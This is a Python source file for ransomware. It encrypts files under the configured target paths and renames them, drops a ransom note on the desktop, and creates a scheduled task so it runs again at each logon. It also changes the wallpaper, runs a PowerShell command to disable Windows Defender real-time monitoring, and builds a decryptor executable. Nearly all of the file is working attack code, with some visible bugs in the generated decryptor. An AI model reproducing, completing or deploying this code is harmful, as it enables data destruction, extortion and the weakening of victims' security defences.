import os
import random
import string
import subprocess
import ctypes
from cryptography.fernet import Fernet
import hashlib
import sys
import base64
import config
import time

# Custom sleep function
def custom_sleep(duration):
    start_time = time.time()
    while time.time() - start_time < duration:
        pass

# Generate a random key
def gen_key():
    return Fernet.generate_key()

# Create a code from the key
def gen_code(key):
    return hashlib.sha256(key).hexdigest()[:16]

# Custom key generation method
def custom_key_gen(code):
    intermediate = hashlib.sha256(code.encode()).digest()
    key = base64.urlsafe_b64encode(intermediate[:32])
    return key

# Encrypt a file and rename it
def enc_file(fpath, key):
    fernet = Fernet(key)
    with open(fpath, 'rb') as f:
        data = f.read()
    enc_data = fernet.encrypt(data)
    with open(fpath, 'wb') as f:
        f.write(enc_data)
    new_fpath = fpath + config.CUSTOM_EXTENSION
    os.rename(fpath, new_fpath)

# Encrypt all targeted files in specified paths
def enc_files(key):
    for t_path in config.TARGET_PATHS:
        for root, _, files in os.walk(t_path):
            for file in files:
                if file == 'NOTE.txt':
                    continue  # Skip the ransom note file
                if any(file.endswith(ext) for ext in config.TARGET_EXTENSIONS):
                    enc_file(os.path.join(root, file), key)

# Create a note on the desktop
def create_note():
    key = gen_key()
    code = gen_code(key)
    enc_key = custom_key_gen(code)
    note_content = config.RANSOM_NOTE_CONTENT.format(decryption_code=code)
    d_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
    note_path = os.path.join(d_path, 'NOTE.txt')
    with open(note_path, 'w') as note:
        note.write(note_content)
    return enc_key

# Add persistence
def add_persist():
    exe_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), config.ENC_EXE)
    t_name = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
    cmd = f'schtasks /create /tn {t_name} /tr "{exe_path}" /sc onlogon /rl highest /f'
    subprocess.run(cmd, shell=True)

# Create decryption script
def create_dec_script(key):
    dec_script = f"""
import os
from cryptography.fernet import Fernet

def dec_file(fpath, key):
    fernet = Fernet(key)
    try:
        with open(fpath, 'rb') as f:
            enc_data = f.read()
        dec_data = fernet.decrypt(enc_data)
        with open(fpath, 'wb') as f:
            f.write(dec_data)
        new_fpath = fpath.replace('{config.CUSTOM_EXTENSION}', '')
        os.rename(fpath, new_fpath)
        print(f"Decrypted: {{new_fpath}}")
    except Exception as e:
        print(f"Failed to decrypt {{fpath}}: {{str(e)}}")

def dec_files():
    d_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
    for root, _, files in os.walk(d_path):
        for file in files:
            if file.endswith('{config.CUSTOM_EXTENSION}'):
                dec_file(os.path.join(root, file), key)

def main():
    key_input = input("Enter the key: ")

    if key_input:
        key = key_input.encode()
        print(f"Key: {{key.decode()}}")
        try:
            dec_files(key)
            print("Files decrypted.")
        except Exception as e:
            print("Failed.")
    else:
        print("No key entered.")

if __name__ == "__main__":
    main()
"""
    return dec_script

# Check if PyInstaller is installed, and install if necessary
def check_and_install_pyinstaller():
    try:
        import PyInstaller
    except ImportError:
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'pyinstaller'])

# Package decryption script into an executable from memory
def package_dec_script_from_memory(dec_script):
    check_and_install_pyinstaller()
    
    with open(config.DEC_SCRIPT, 'w') as script_file:
        script_file.write(dec_script)
    
    cmd = f'pyinstaller --onefile {config.DEC_SCRIPT}'
    process = subprocess.Popen(cmd, shell=True)
    process.communicate()

    dist_path = 'dist'
    if os.path.exists(dist_path):
        dec_exe_path = os.path.join(dist_path, config.DEC_SCRIPT.replace('.py', '.exe'))
        final_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop', config.DEC_EXE)
        os.rename(dec_exe_path, final_path)
        os.remove(config.DEC_SCRIPT)
    else:
        print("Failed to create executable")

# Change the desktop wallpaper
def change_wallpaper():
    wallpaper_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'images', 'wallpaper.png')
    ctypes.windll.user32.SystemParametersInfoW(20, 0, wallpaper_path, 0)

# Attempt to disable Windows Defender
def disable_defender():
    cmd = 'powershell Set-MpPreference -DisableRealtimeMonitoring $true'
    subprocess.run(cmd, shell=True)

# Main function to run the process
def main():
    custom_sleep(config.DELAY_TIME)
    
    enc_key = create_note()
    if enc_key:
        enc_files(enc_key)
        if config.ADD_PERSISTENCE:
            add_persist()
        change_wallpaper()
        if config.DISABLE_WINDOWS_DEFENDER:
            disable_defender()
        dec_script = create_dec_script(enc_key.decode())
        package_dec_script_from_memory(dec_script)
        print("Process completed.")
    else:
        print("Process failed.")

if __name__ == "__main__":
    main()
